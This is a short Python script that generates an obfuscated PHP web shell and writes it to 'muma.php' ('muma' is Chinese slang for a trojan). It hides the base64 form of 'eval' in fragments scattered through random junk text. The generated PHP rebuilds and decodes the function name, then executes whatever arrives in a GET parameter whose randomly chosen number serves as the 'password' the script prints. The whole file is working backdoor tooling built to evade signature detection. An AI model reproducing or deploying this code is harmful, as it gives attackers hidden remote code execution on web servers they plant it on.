import base64
import random
file=open('muma.php',mode='w')
file.write('<?php\n')
sentence='azkjdoqpdkmeszqatfxmxvcizudecjamgwnzqovoyrqwxukbfpfewthqodqozdxyuvrcienwijucuptmxasnsozyqkkgkehwvfjrzoceyuanpytrqugwwqambzxsvtdckdyrihjeuwxfuqcpneevgifnjykdmkjkwastlskqhgddjrnyqpdopeipqlevdswchnbjfkssvanjdranpalududlilzoijdoifaslnwbcqdekjsugdfacs'
a=random.randint(ord('a'),ord('z'))
a=chr(a)
sentence=sentence.split(a)
b64='ZXZhbA=='
x='ZXZ'
y='hbA'
z='=='
cha='aaa'
length=len(sentence)


while True:
    a=random.randint(1,length)
    b= random.randint(1, length)
    c = random.randint(1, length)
    if a!=b and a!=c and b!=c:
        break

num=0
for i in sentence:
    num=num+1
    cha=cha+'.'+i
    if num==a:
     cha=cha+'.'+x
    if num==b:
     cha=cha+'.'+y
    if num==c:
     cha=cha+'.'+z
file.write(f'$ch = explode(".","{cha}");\n')

cha=cha.split('.')
num=0

for i in cha:


    if i=='ZXZ':
        a=num
    if i=='hbA':
        b=num
    if i=='==':
        c=num
    num=num+1

file.write(f'$c = $ch[{a}].$ch[{b}].$ch[{c}];\n')
file.write('$c=base64_decode($c);\n')
code=random.randint(55,255)
file.write(f'$c($_GET[{code}]);\n')
#$ch = explode(".","hello.ZXZ.world.va.==.hbA.saucerman");
#$c = $ch[1].$ch[5].$ch[4];
file.write('?>')
print(f'木马生成完毕，密码为 {code}')